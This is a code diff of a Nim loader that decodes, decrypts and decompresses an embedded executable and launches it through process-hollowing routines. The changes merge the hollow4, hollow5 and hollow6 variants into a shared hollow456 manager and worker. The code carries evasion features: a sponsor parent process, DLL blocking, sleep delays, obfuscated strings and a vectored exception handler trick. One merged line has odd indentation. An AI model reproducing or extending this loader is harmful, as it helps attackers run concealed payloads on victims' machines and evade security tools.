@@ -16,10 +16,8 @@ when defined(hollow1):
     import hollow1
 when defined(hollow2) or defined(hollow3):
     import hollow23
-when defined(hollow4):
-    import hollow4
-when defined(hollow5) or defined(hollow6):
-    import hollow56
+when defined(hollow4) or defined(hollow5) or defined(hollow6):
+    import hollow456
 
 # Raising VEH
 {.emit: """
@@ -33,7 +31,6 @@ proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}
 
 proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0, isEncrypted: bool): bool =
       
-
     # Decode, (Decrypt) and decompress PE
     let commandLineParams = commandLineParams()
     var decodedPayload = decode(payload)
@@ -53,16 +50,12 @@ proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls
     else:
         peStr = uncompress(decodedPayload)
 
-
     # Check hollowsplitted args 
     when defined(hollow4) or defined(hollow5) or defined(hollow6):
         for i in commandLineParams:
             if i.startsWith(protectString("-A:")) or i.startsWith(protectString("-W:")) or i.startsWith(protectString("-T:")) or i.startsWith(protectString("-R:")):
                 # This is a worker process in splitted hollow, let it go
-                when defined(hollow4):
-                    return hollow4Worker(peStr)
-                when defined(hollow5) or defined(hollow6):
-                    return hollow56Worker(peStr)
+                    return hollow456Worker(peStr)
         if not (protectString("-M") in commandLineParams):
             quit(1)
 
@@ -86,10 +79,8 @@ proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls
         return hollow1(peStr, ppi)
     when defined(hollow2) or defined(hollow3):
         return hollow23(peStr, ppi)
-    when defined(hollow4):
-        return hollow4Manager(peStr, ppi)
-    when defined(hollow5) or defined(hollow6):
-        return hollow56Manager(peStr, ppi)
+    when defined(hollow4) or defined(hollow5) or defined(hollow6):
+        return hollow456Manager(peStr, ppi)
 
 
 proc wrap_execute() =
